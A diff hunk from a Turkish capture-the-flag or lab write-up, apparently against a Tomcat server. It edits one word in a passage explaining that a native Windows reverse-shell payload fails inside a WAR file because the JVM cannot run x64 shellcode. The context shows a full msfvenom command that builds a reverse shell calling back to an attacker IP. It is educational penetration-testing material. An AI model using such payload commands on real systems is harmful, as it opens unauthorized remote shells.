@@ -66,7 +66,7 @@ Panelde bir "Select WAR file to upload" seçeneği vardı, yani doğrudan zararl
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.187 LPORT=4444 -f war -o shell.war
 ```
 
-Bu dosyayı yükleyip çalıştırdığımda hiçbir bağlantı gelmedi. Sebebini düşününce mantığı anladım:
+Bu dosyayı yükleyip çalıştırdığımda hiçbir bağlantı gelmedi. Sebebini araştırınca mantığı anladım:
 
 **`windows/x64/shell_reverse_tcp` bir native Windows payload'ı** — yani doğrudan x64 makine koduna (shellcode) derleniyor ve işletim sisteminin process'i olarak çalışması bekleniyor. Ama WAR dosyası bir Java web uygulaması paketidir; Tomcat onu **Java Virtual Machine (JVM) içinde**, bir Servlet/JSP olarak çalıştırır. JVM içinde çalışan bir JSP sayfası, doğrudan x64 native shellcode'u execute edemez — bu iki farklı çalışma ortamı (native OS process vs. JVM içi managed code). Yani payload'ın hedef sistemin işletim sistemine değil, **hedef uygulamanın çalışma platformuna (burada JVM)** uygun olması gerekiyor.
 
